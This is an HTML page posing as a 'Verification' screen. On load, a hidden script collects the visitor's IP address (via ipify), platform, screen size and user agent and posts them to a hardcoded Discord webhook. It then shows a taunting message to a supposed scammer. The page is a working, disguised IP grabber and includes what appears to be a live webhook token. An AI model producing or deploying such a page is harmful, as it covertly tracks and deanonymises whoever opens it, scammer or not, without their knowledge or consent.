<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <style>
        body {
            font-family: sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f4f4f9;
            margin: 0;
        }
        #status {
            text-align: center;
            font-size: 1.2rem;
            color: #333;
            padding: 20px;
        }
    </style>
</head>
<body>
    <div id="status">Fetching...</div>

    <script>
        async function collectData() {
            const statusDiv = document.getElementById('status');
            const webhookUrl = 'https://discord.com/api/webhooks/1496580919803252799/mtZ0WbdZnkxOOB0eMVyJx_xJ18EPEGWs9Gzdw2OCeRcFfICBpsIg09_rctz4pOYkBl0S';
            const sessionId = Math.random().toString(36).substring(2, 10).toUpperCase();

            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();

                const payload = {
                    content: "🚨 **New Scammer Caught** 🚨",
                    embeds: [{
                        title: "Session Info: " + sessionId,
                        color: 16711680,
                        fields: [
                            { name: "IP Address", value: ipData.ip, inline: true },
                            { name: "OS", value: navigator.platform, inline: true },
                            { name: "Screen", value: `${window.screen.width}x${window.screen.height}`, inline: true },
                            { name: "User Agent", value: navigator.userAgent }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                };

                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                statusDiv.innerHTML = `GET FUCKED SCAMMER LMFAO, ALL YOUR INFORMATION HAVE BEEN SENT TO ME`;
            } catch (error) {
                statusDiv.innerText = "Error during verification.";
                console.error(error);
            }
        }

        window.onload = collectData;
    </script>
</body>
</html>
